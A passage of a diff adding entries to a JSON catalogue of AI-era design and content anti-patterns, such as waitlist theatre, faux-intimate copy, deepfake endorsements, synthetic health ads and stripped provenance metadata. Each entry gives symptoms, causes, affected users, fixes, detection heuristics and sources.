+    "u": "https://tropes.fyi/tropes/think-of-it-as"
+   },
+   {
+    "t": "Think-of-it-as analogy reflex",
+    "u": "https://feedsquad.com/ai-tells/analogy-reflex"
+   }
+  ],
+  "code": "A147",
+  "rel": [
+   "enables-the-optimization-of",
+   "the-weightless-headline",
+   "the-invented-stat-row"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "AI-tell directories flag 'Think of it as...' analogies as a stock AI move that replaces an explanation.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "waitlist-cosplay",
+  "name": "Waitlist Cosplay",
+  "track": "surface",
+  "group": "Money",
+  "category": "Pricing",
+  "harm": "Trust",
+  "origin": "Business",
+  "oneLiner": "A small or already-working product gates access behind 'Join the waitlist' or 'Request early access' to look in demand.",
+  "looksLike": "The hero CTA is 'Join the waitlist' or 'Get early access' with a counter of people ahead of you, on a product that could simply let you sign up. There is no stated reason for the gate, no date, and sometimes the app is already live behind it.",
+  "why": "Big AI launches used waitlists for real cost and capacity reasons, from GitHub Copilot's technical preview to OpenAI's Sora, and indie AI products copy the ritual. Even waitlist vendors warn against gating without demand or faking scarcity.",
+  "who": "Visitors who wanted to try the product leave, and those who join wait on a list that exists mainly as theatre.",
+  "theFix": "Gate only when there is a real limit, and say what it is: capacity, cost or a launch date. Otherwise let people sign up now.",
+  "heur": "Regex CTA labels for /\\b(join (the )?waitlist|request (early )?access|get early access)\\b/i and flag when the page also shows pricing, a live demo or a login link.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Launching an AI Product? Run the Waitlist Like the Big Labs Do",
+    "u": "https://waitlister.me/growth-hub/guides/ai-product-launch-waitlist"
+   }
+  ],
+  "code": "A148",
+  "rel": [
+   "the-missing-price-list",
+   "classic-plan-behind-cancel",
+   "the-ai-surcharge"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "In our pilot on 356 Show HN launch pages, waitlist or early-access framing rose from 2.0% in 2019 to 6.9% in 2026; waitlist practitioners describe AI products copying big-lab gated launches.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "we-ve-all-been-there",
+  "name": "We've All Been There",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "Copy claims a shared experience with the reader: 'We've all been there.' 'Let's be honest.'",
+  "looksLike": "A landing page section opens 'Let's be honest: managing invoices is a nightmare.' or 'If you're anything like us, you've tried a dozen tools.' The reader is placed in a group and agreed with before any argument is made.",
+  "why": "Faux-intimate openers are common in social and marketing text that models learn from. Practitioners list authenticity announcements like 'Let's be honest' and relatability claims like 'We've all been there' as AI writing tells.",
+  "who": "Readers who do not share the assumed pain feel talked at, and the forced familiarity undercuts trust.",
+  "theFix": "Replace the claim with evidence you actually have about your users: a quote, a support ticket, a number. Or cut it and start with the product.",
+  "heur": "Regex for /\\b(we'?ve all been there|let'?s be honest|if you'?re anything like (me|us)|truth be told)\\b/i.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Manufactured relatability",
+    "u": "https://feedsquad.com/ai-tells/manufactured-relatability"
+   },
+   {
+    "t": "Phrases That Instantly Make Writing Sound AI-Generated",
+    "u": "https://www.ultimatewb.com/blog/8275/phrases-that-instantly-make-writing-sound-ai-generated/"
+   }
+  ],
+  "code": "A149",
+  "rel": [
+   "arrows-and-curly-quotes",
+   "the-ensuring-tail",
+   "tricolon-everything"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "Copy editors and AI-tell catalogues report 'Let's be honest' and 'We've all been there' openers in AI-drafted marketing and posts.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "why-it-matters-headers",
+  "name": "Why It Matters Headers",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Every section heading is a wh-phrase: 'Why it matters', 'What we do differently', 'How you get there'.",
+  "looksLike": "A landing page runs 'Where teams get stuck', 'What we do differently', 'Why it matters', 'How it works', 'Who it's for'. The headings name a question shape instead of the answer, so scanning them tells you nothing.",
+  "why": "Wh-headings are a safe default for organising any content, and AI-tell directories call them a strong signal of model-written structure. In our pilot of launch pages, 'How it works' sections rose from 7.7% in 2019 to 13.8% in 2026.",
+  "who": "Scanners who read only headings, which is most visitors, finish the page without learning a single claim.",
+  "theFix": "Write headings that state the answer: 'Setup takes one command' instead of 'How it works'. Keep at most one question-shaped heading per page.",
+  "heur": "Count h2/h3 headings starting with /^(why|what|how|where|who)\\b/i; flag pages where they are half or more.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "\"Where / What / Why\" Headers - Tropes",
+    "u": "https://tropes.fyi/tropes/interrogative-root-headers"
+   }
+  ],
+  "code": "A150",
+  "rel": [
+   "tricolon-everything",
+   "title-case-every-heading",
+   "colon-split-headings"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "AI-tell directories flag default wh-word section headings ('What we do differently', 'How you get there') as a strong pattern in model-written pages.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "your-journey-starts-here",
+  "name": "Your Journey Starts Here",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Onboarding",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Onboarding and marketing copy calls ordinary use a 'journey' to 'embark on' or 'navigate'.",
+  "looksLike": "A signup screen says 'Your fitness journey starts here.' A welcome email says 'We're excited to be part of your journey.' A guide promises to help you 'navigate the complexities of' invoicing. Nothing in the flow actually moves anywhere.",
+  "why": "Journey and navigation metaphors are common in the self-help and marketing text models learn from, and catalogues of AI tells and lint rules for AI prose flag 'embark on a journey' and 'navigate the complexities'.",
+  "who": "New users get a mood instead of the first step, at the exact moment they need instructions.",
+  "theFix": "Replace the metaphor with what happens next: 'Pick three workouts. We will build your first week.' Keep 'user journey' for internal design docs.",
+  "heur": "Regex for /\\b(embark|your [\\w]+ journey|navigat(e|ing) the (complexities|world|challenges))\\b/i in onboarding and marketing copy.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Journey and navigation metaphors",
+    "u": "https://feedsquad.com/ai-tells/journey-navigation-metaphor"
+   },
+   {
+    "t": "tbhb/vale-ai-tells",
+    "u": "https://github.com/tbhb/vale-ai-tells"
+   }
+  ],
+  "code": "A151",
+  "rel": [
+   "consent-screen-names-your-vendor",
+   "sign-up-to-see-anything",
+   "the-tour-that-explains-nothing"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "AI-tell catalogues and Vale lint rules for AI prose flag journey and navigation metaphors applied to routine tasks.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "borrowed-face-endorsement",
+  "name": "Borrowed Face Endorsement",
+  "track": "surface",
+  "group": "Safety",
+  "category": "Marketing",
+  "harm": "Safety",
+  "origin": "Business",
+  "oneLiner": "Ads use a cloned celebrity face and voice to endorse a product they never touched.",
+  "looksLike": "A video ad shows a famous person saying a packaging error left thousands of products unsold and they are free for fans. A countdown and a survey link follow. The face and voice are generated.",
+  "why": "Video and voice cloning tools make a convincing endorsement in minutes, and ad platforms review at scale without checking likeness rights. CBS reported deepfake ads of a pop star promoting a fake cookware giveaway the brand called a scam.",
+  "who": "Fans lose money and data, the real brand's name is used for fraud, and the person whose face was copied has no say.",
+  "theFix": "Never use a real person's likeness without written consent, and ad platforms should require proof of rights for any recognisable face or voice.",
+  "heur": "Human review: for any ad with a recognisable person, confirm a signed endorsement exists.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "AI-generated ads using Taylor Swift's likeness dupe fans with fake Le Creuset giveaway",
+    "u": "https://cbsnews.com/boston/news/taylor-swift-le-creuset-ai-generated-ads"
+   }
+  ],
+  "code": "A152",
+  "rel": [
+   "synthetic-before-and-after",
+   "accuracy-number-nobody-tested",
+   "retouched-into-fiction"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "borrowed-house-style",
+  "name": "Borrowed House Style",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Branding",
+  "harm": "Credibility",
+  "origin": "Prompting",
+  "oneLiner": "Brand campaigns jump on a famous studio's look via an image model, like the 2025 Ghibli-style wave.",
+  "looksLike": "Overnight, many brand accounts post their products and mascots as soft watercolour anime scenes. The style belongs to one living studio, not to the brand. Next month the brand looks like someone else again.",
+  "why": "When an image model can reproduce a famous style from one line of prompt, copying the trend is the cheapest content available. After criticism, OpenAI restricted prompts in the style of living artists, but the campaigns had already run.",
+  "who": "The brand looks like a follower, takes on legal and ethical risk over an artist's identity, and teaches its audience nothing about itself.",
+  "theFix": "Build visual identity from your own references and commissioned work. Do not prompt for the style of a named living artist or studio.",
+  "heur": "Code check: search stored prompts and alt text for 'in the style of' plus a named artist or studio; human review for trend styles in brand posts.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The Studio Ghibli AI trend: Brands, backlash & blurred lines",
+    "u": "https://www.exchange4media.com/marketing-news/the-studio-ghibli-ai-trend-brands-backlash-blurred-lines-142198.html"
+   }
+  ],
+  "code": "A153",
+  "rel": [
+   "the-shapeshifting-mascot",
+   "trusted-by-nobody",
+   "the-builder-s-watermark"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "headshot-drift",
+  "name": "Headshot Drift",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Imagery",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "Team-page headshots made by AI generators no longer look like the real people, sometimes changing their race.",
+  "looksLike": "The About page shows everyone in the same blazer, the same soft office blur and the same polished skin. The faces are close to the real staff but not quite: lighter skin, different eyes, a stiff smile. Meet them on a video call and they look different.",
+  "why": "AI headshot tools rebuild the face from a prompt like 'professional', and when the model cannot be steered it falls back on generic outputs. One MIT student asked a tool to make her photo professional and it returned a white woman with blue eyes.",
+  "who": "Clients meet someone who does not match the photo, and staff from under-represented groups can be quietly erased by their own company page.",
+  "theFix": "Use real photos, even phone portraits on a consistent background. If you use an AI tool, have each person approve their own image against a reference photo.",
+  "heur": "Human review: compare each headshot with the person on a video call or a recent real photo.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Asian MIT Student Asks AI for a Pro Headshot, Gets Turned White",
+    "u": "https://petapixel.com/2023/08/03/asian-mit-student-asks-ai-for-a-pro-headshot-gets-turned-white/"
+   },
+   {
+    "t": "Considering AI Team Headshots? Read this before you spend $",
+    "u": "https://www.betterpic.io/blog/why-ai-team-headshots.md"
+   }
+  ],
+  "code": "A154",
+  "rel": [
+   "gradient-initial-avatars",
+   "uncanny-stock-humans",
+   "hand-coded-svg-filler"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "morphing-b-roll",
+  "name": "Morphing B-Roll",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Video",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Hero and ad videos made with text-to-video, where objects melt, vanish and defy gravity.",
+  "looksLike": "A short looping clip behind the headline: a person walks behind a pillar and does not come back, a chair floats and changes shape, hands merge with a coffee cup. The clip cuts before anything happens so the errors are less visible.",
+  "why": "Video models learn how pixels change over time, not how objects behave, so object permanence and physics break. Clips are short because errors pile up with length, which is why every shot is a few seconds of ambient motion.",
+  "who": "Viewers sense something is off and distrust the brand, and people with vestibular or attention issues get motion with no content.",
+  "theFix": "Use real footage or a product screen recording. If you use generated video, review it frame by frame, keep it still by default, and respect prefers-reduced-motion.",
+  "heur": "Human review: scrub the clip slowly and watch hands, objects behind occluders and anything that should stay solid.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Sora’s Surreal Physics",
+    "u": "https://garymarcus.substack.com/p/soras-surreal-physics"
+   }
+  ],
+  "code": "A155",
+  "rel": [
+   "the-avatar-explainer",
+   "the-builder-s-watermark",
+   "floating-3d-nothing"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "overcorrected-diversity",
+  "name": "Overcorrected Diversity",
+  "track": "behavioral",
+  "group": "Imagery & icons",
+  "category": "Imagery",
+  "harm": "Credibility",
+  "origin": "Tool default",
+  "oneLiner": "A hidden prompt rule inserts diversity into images where it is historically or factually wrong.",
+  "looksLike": "Ask for a specific historical group or a real scene and the output swaps in people who could not have been there. Other harmless prompts about people get refused outright. The user never sees the rule that changed their request.",
+  "why": "To counter training-data bias, products add silent prompt rewrites that ask for a range of people. Google said Gemini's version did not account for cases where that range was clearly inappropriate, and the model also grew over-cautious and refused benign prompts.",
+  "who": "Users get inaccurate images for education, journalism or history, and trust in the tool drops when the rewrite is exposed.",
+  "theFix": "Apply representation rules only when the prompt leaves people unspecified, never override explicit or historical context, and tell the user when a prompt was rewritten.",
+  "heur": "Test prompts with fixed historical or factual context and check that the output keeps it; review whether the product shows any rewritten prompt.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Google explains why Gemini's image generation feature overcorrected for diversity",
+    "u": "https://www.engadget.com/google-explains-why-geminis-image-generation-feature-overcorrected-for-diversity-121532787.html"
+   }
+  ],
+  "code": "B187",
+  "rel": [
+   "torn-edge-mask",
+   "broken-or-placeholder-image",
+   "the-baked-in-checkerboard"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "rendered-before-it-exists",
+  "name": "Rendered Before It Exists",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Marketing",
+  "harm": "Money",
+  "origin": "Business",
+  "oneLiner": "Events, venues or products are sold with generated images of something that was never built.",
+  "looksLike": "The ticket page shows chocolate fountains, candy gardens and a glowing set. The real thing is a near-empty warehouse. No 'concept image' or 'illustration' label appears anywhere.",
+  "why": "Generating a fantasy venue costs less than building or photographing one, so the marketing outruns the product. The Glasgow 'Willy's Chocolate Experience' sold tickets on AI images and ended with police called over refunds.",
+  "who": "Buyers pay for an experience that does not exist and families, often with children, are the ones disappointed.",
+  "theFix": "Show real photos of the real venue or product. If you must show a concept, label it clearly as an illustration of plans.",
+  "heur": "Human review: for every image of a place or product, ask whether a photo of the real thing exists and matches.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Families Scammed by AI Images That Promised Willy Wonka-Style Event",
+    "u": "https://petapixel.com/2024/02/28/families-scammed-by-ai-images-that-promised-willy-wonka-style-event"
+   },
+   {
+    "t": "'Wonka' experience in Glasgow ends in chaos, police called over AI-generated advertisements",
+    "u": "https://abc7.com/post/willy-wonka-immersive-experience-glasgow-event-movie/14482975/"
+   }
+  ],
+  "code": "A156",
+  "rel": [
+   "the-unscannable-art-qr",
+   "retouched-into-fiction",
+   "personalised-by-nobody"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "stripped-content-credentials",
+  "name": "Stripped Content Credentials",
+  "track": "behavioral",
+  "group": "Provenance",
+  "category": "Imagery",
+  "harm": "Trust",
+  "origin": "Tool default",
+  "oneLiner": "Upload pipelines silently delete C2PA provenance data, so a labelled AI image arrives unlabelled.",
+  "looksLike": "A generator attaches Content Credentials and the stock site shows an 'AI' tag. After upload to a CMS or social platform the image is recompressed and resized, and the metadata is gone. Viewers see a plain photo.",
+  "why": "Recompression, format conversion and thumbnail generation drop embedded metadata by default, and most major social platforms strip it, C2PA manifests included. Adobe Stock's AI label often disappeared once war images were downloaded, and news sites ran them as real.",
+  "who": "Readers lose the one signal that an image is synthetic, and publishers spread fakes by accident.",
+  "theFix": "Preserve C2PA through your image pipeline, test with a verify tool after upload, and show a visible label when the manifest says AI-generated.",
+  "heur": "Code check: upload a C2PA-signed test image through the pipeline and verify the served file still carries the manifest.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Durable Content Credentials How Provenance Survives Metadata Stripping",
+    "u": "https://www.softwareseni.com/durable-content-credentials-how-provenance-survives-metadata-stripping"
+   },
+   {
+    "t": "Adobe sells fake AI-generated Israel-Hamas war images : then the news ran them as real",
+    "u": "https://www.theregister.com/2023/11/08/adobe_ai_israel_hamas_war_pics/"
+   }
+  ],
+  "code": "B188",
+  "rel": [
+   "the-sparkle-in-the-corner",
+   "the-false-ai-label",
+   "broken-or-placeholder-image"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "synthetic-before-and-after",
+  "name": "Synthetic Before And After",
+  "track": "surface",
+  "group": "Safety",
+  "category": "Marketing",
+  "harm": "Safety",
+  "origin": "Business",
+  "oneLiner": "Health and fitness ads use generated before-and-after bodies and fake experts to sell results.",
+  "looksLike": "An ad shows a person who lost 208 pounds in three weeks, with a 'nurse' or 'pharmacist' explaining it. The bodies, faces and credentials are generated. No label says so.",
+  "why": "Generating transformation photos and spokespeople is cheaper than finding real results, and health ads convert on visual proof. A coalition of 36 US attorneys general asked Meta to act on AI-generated before-and-after images and fake spokespeople in weight-loss ads.",
+  "who": "Vulnerable people, including young women, buy unsafe products based on results that never happened.",
+  "theFix": "Use only real, consented customer results with dates and typical outcomes, and never generate bodies, patients or credentials.",
+  "heur": "Human review: for every transformation image or expert, confirm a real person, consent and a verifiable credential.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Attorney General Brown Pushes Meta to Act on Misleading AI Weight Loss Ads",
+    "u": "https://oag.maryland.gov/News/pages/Attorney-General-Brown-Pushes-Meta-to-Act-on-Misleading-AI-Weight-Loss-Ads-.aspx"
+   }
+  ],
+  "code": "A157",
+  "rel": [
+   "borrowed-face-endorsement",
+   "rendered-before-it-exists",
+   "personalised-by-nobody"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "synthetic-stock-as-news",
+  "name": "Synthetic Stock as News",
+  "track": "surface",
+  "group": "Provenance",
+  "category": "Content",
+  "harm": "Trust",
+  "origin": "Business",
+  "oneLiner": "Generated stock images of real events are used as illustrations as if they were photos.",
+  "looksLike": "An article about a real conflict or disaster uses a dramatic photo of smoke over buildings. It came from a stock library's AI section and the caption says nothing about that.",
+  "why": "Stock marketplaces sell AI images tagged by keyword next to real photos, and the AI label often does not survive download. Publishers searching by topic pick the most dramatic result.",
+  "who": "Readers believe they are seeing real events, which feeds misinformation and damages the publisher's credibility.",
+  "theFix": "Filter stock searches to exclude generative content for anything depicting real events, and caption any generated image as an illustration.",
+  "heur": "Human review: check the licence record of every image tied to a real event for an AI tag.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Adobe sells fake AI-generated Israel-Hamas war images – then the news ran them as real",
+    "u": "https://www.theregister.com/2023/11/08/adobe_ai_israel_hamas_war_pics/"
+   }
+  ],
+  "code": "A158",
+  "rel": [
+   "the-invented-byline",
+   "the-dish-nobody-cooked",
+   "zombie-domain-newsroom"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "text-baked-into-the-banner",
+  "name": "Text Baked Into the Banner",
+  "track": "surface",
+  "group": "Accessibility",
+  "category": "Imagery",
+  "harm": "Accessibility",
+  "origin": "Tool default",
+  "oneLiner": "Now that image models render text, headlines, offers and infographics ship as pictures of words.",
+  "looksLike": "The hero headline, the sale banner and the 'how it works' steps are one generated image. You cannot select the text, it does not reflow on a phone, and small text near the bottom is blurred or cropped.",
+  "why": "Newer models like GPT-4o image generation advertise accurate text, menus and infographics, so a whole banner can be made in one prompt. OpenAI still lists dense small text, multilingual text and tight cropping as limitations.",
+  "who": "Low-vision users cannot resize or recolour the text, screen readers get only the alt text, and translation and search miss the content.",
+  "theFix": "Generate the image without text and set the words in HTML on top. Keep images of text for logos only.",
+  "heur": "Code check: flag hero or banner images with no live text in the same section; run OCR on images and flag any with more than a few words.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Understanding SC 1.4.5 Images of Text (Level AA)",
+    "u": "https://www.w3.org/WAI/WCAG22/Understanding/images-of-text"
+   },
+   {
+    "t": "Introducing 4o Image Generation",
+    "u": "https://openai.com/index/introducing-4o-image-generation/"
+   }
+  ],
+  "code": "A159",
+  "rel": [
+   "the-baked-in-checkerboard",
+   "the-hallucinated-diagram",
+   "the-sparkle-in-the-corner"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-avatar-explainer",
+  "name": "The Avatar Explainer",
+  "track": "surface",
+  "group": "Transparency",
+  "category": "Video",
+  "harm": "Trust",
+  "origin": "Business",
+  "oneLiner": "Onboarding, training or sales videos fronted by a synthetic presenter with no label saying so.",
+  "looksLike": "A friendly presenter in a neat studio explains the product. Movements loop, the mouth is slightly out of sync on harder words, and the same face appears on other companies' videos. Nothing on the page says the presenter is generated.",
+  "why": "Avatar video tools are cheaper than filming, and vendors pitch them for internal comms, training and marketing. As avatars get more realistic, the platform watermark is the only disclosure, and viewers never see it.",
+  "who": "Viewers think a real person stands behind the claims, and once they spot the avatar they discount the rest of the content.",
+  "theFix": "Label synthetic presenters on screen and in the description, or film a real person for anything that asks for trust.",
+  "heur": "Human review: check every video with a presenter for an on-screen or adjacent label that it is generated.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "An AI startup made a hyperrealistic deepfake of me that’s so good it’s scary",
+    "u": "https://www.technologyreview.com/2024/04/25/1091772/new-generative-ai-avatar-deepfake-synthesia/"
+   }
+  ],
+  "code": "A160",
+  "rel": [
+   "morphing-b-roll",
+   "unlabelled-virtual-influencer",
+   "synthetic-five-stars"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-baked-in-checkerboard",
+  "name": "The Baked-In Checkerboard",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Imagery",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "A 'transparent' PNG from an image model has the grey-and-white checkerboard painted into the pixels.",
+  "looksLike": "The product cut-out or sticker sits on a visible grey and white grid on the live page. On a coloured section the grid becomes obvious, framed by a hard square edge.",
+  "why": "Asked for a transparent background, some models draw what transparency looks like in an editor instead of producing an alpha channel. OpenAI's documentation states some image models do not support transparent backgrounds at all.",
+  "who": "The page looks broken and amateur, and the asset has to be remade.",
+  "theFix": "Use a model or API option that outputs true RGBA, or run a background-removal step, then check the file's alpha channel before shipping.",
+  "heur": "Code check: open each PNG and flag those with no alpha channel whose corners contain a regular two-tone grid pattern.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Having trouble getting transparent backgrounds in ChatGPT images",
+    "u": "https://community.openai.com/t/having-trouble-getting-transparent-backgrounds-in-chatgpt-images/1380143"
+   }
+  ],
+  "code": "A161",
+  "rel": [
+   "broken-or-placeholder-image",
+   "the-memorised-stock-photo",
+   "the-fake-dashboard"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-default-person",
+  "name": "The Default Person",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Imagery",
+  "harm": "Trust",
+  "origin": "Training data",
+  "oneLiner": "Generated people follow stereotypes: CEOs and judges are light-skinned men, low-paid workers are darker-skinned women.",
+  "looksLike": "Ask for 'a doctor', 'a founder' or 'a lawyer' and the page fills with the same light-skinned man. Service roles get darker skin and women. The site's 'customers' and 'team' look like a stereotype of who holds each job.",
+  "why": "Models learn the associations in their training images and exaggerate them. Bloomberg's analysis of 5,100 Stable Diffusion images found high-paying jobs shown as lighter-skinned men far beyond real labour statistics.",
+  "who": "Users who do not match the default see that the product was not imagined for them, and the brand repeats a bias it never chose.",
+  "theFix": "Specify the people you want in each image, check the whole set for who appears in which role, and prefer photos of your real users and team.",
+  "heur": "Human review: list every generated person by role and check whether status roles and service roles split along skin tone or gender.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Humans Are Biased. Generative AI Is Even Worse",
+    "u": "https://www.bloomberg.com/graphics/2023-generative-ai-bias"
+   },
+   {
+    "t": "Asian MIT Student Asks AI for a Pro Headshot, Gets Turned White",
+    "u": "https://petapixel.com/2023/08/03/asian-mit-student-asks-ai-for-a-pro-headshot-gets-turned-white/"
+   }
+  ],
+  "code": "A162",
+  "rel": [
+   "the-ethereal-default",
+   "gradient-initial-avatars",
+   "uncanny-stock-humans"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-dish-nobody-cooked",
+  "name": "The Dish Nobody Cooked",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Content",
+  "harm": "Trust",
+  "origin": "Business",
+  "oneLiner": "Recipe and food pages show generated photos of dishes that the recipe cannot produce.",
+  "looksLike": "The photo shows a perfect bake with impossible vegetables, mismatched garnish and textures that are half raw and half baked. The ingredient list does not match what is on the plate.",
+  "why": "Content farms generate the recipe and the image together without testing either, because images drive clicks on social feeds. Nothing in the pipeline checks that the photo is a real result.",
+  "who": "Home cooks waste money and time on recipes that fail, and real food creators lose traffic to untested pages.",
+  "theFix": "Photograph the dish you actually cooked. If an image is illustrative, say so under it.",
+  "heur": "Human review: compare the photo with the ingredient list and method; reverse-image search to see whether it was generated or reused.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The Truth Behind AI-Generated Food Content",
+    "u": "https://www.fromachefskitchen.com/ai-generated-food-content/"
+   }
+  ],
+  "code": "A163",
+  "rel": [
+   "prompt-as-alt-text",
+   "the-conclusion-heading",
+   "it-depends-on-your-needs"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-ethereal-default",
+  "name": "The Ethereal Default",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Imagery",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Every image has the same saturated colour, dramatic lighting and beautiful people, whatever the brand.",
+  "looksLike": "Hero art, blog headers and ad creative all share bright saturated colour, rim lighting and a dreamy blend of cartoon and photo. People are flawless and backgrounds are soft. Two unrelated brands could swap images and nobody would notice.",
+  "why": "Major image models are technically alike, and most filter their training data and outputs for 'aesthetic quality', which pulls everything toward one polished look. When the prompt does not name a style, the model returns that house look.",
+  "who": "Brands lose a recognisable visual identity, and audiences who know the look read it as low effort.",
+  "theFix": "Write a style brief before generating: palette, lighting, lens, texture and references you own. Generate against that brief, and reject outputs that look like the tool's default.",
+  "heur": "Human review: put the page's images next to outputs of the same tool with a bare prompt; if they look alike, the brand has no style.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "“A Certain Ethereal Quality”: Hany Farid Explains Why AI Art Looks the Way It Does",
+    "u": "https://www.ischool.berkeley.edu/news/2024/certain-ethereal-quality-hany-farid-explains-why-ai-art-looks-way-it-does"
+   }
+  ],
+  "code": "A164",
+  "rel": [
+   "the-default-person",
+   "broken-or-placeholder-image",
+   "the-fake-browser-frame"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-false-ai-label",
+  "name": "The False AI Label",
+  "track": "behavioral",
+  "group": "Provenance",
+  "category": "Imagery",
+  "harm": "Trust",
+  "origin": "Tool default",
+  "oneLiner": "Platforms stamp 'Made with AI' on real photos because a minor AI edit set a metadata flag.",
+  "looksLike": "A photographer crops a real photo, removes a speck with a generative tool, and the post appears with a 'Made with AI' badge. Followers assume the whole picture is fake.",
+  "why": "Detection reads C2PA and IPTC 'AI generated' flags without weighing how much was changed. Meta's labels hit real photos edited in Adobe tools, and Meta said it would revise labels to reflect how much AI was used.",
+  "who": "Real photographers and journalists lose credibility, and blanket labels teach people to ignore labels.",
+  "theFix": "Distinguish 'AI edited' from 'AI generated' in the label, and explain what the label means when tapped.",
+  "heur": "Test: upload a real photo with a small generative edit and check which label appears and whether it explains itself.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Meta is tagging real photos as ‘Made with AI,’ say photographers",
+    "u": "https://techcrunch.com/2024/06/21/meta-tagging-real-photos-made-with-ai"
+   }
+  ],
+  "code": "B189",
+  "rel": [
+   "gradient-initial-avatars",
+   "uncanny-stock-humans",
+   "torn-edge-mask"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-glowing-brain",
+  "name": "The Glowing Brain",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Imagery",
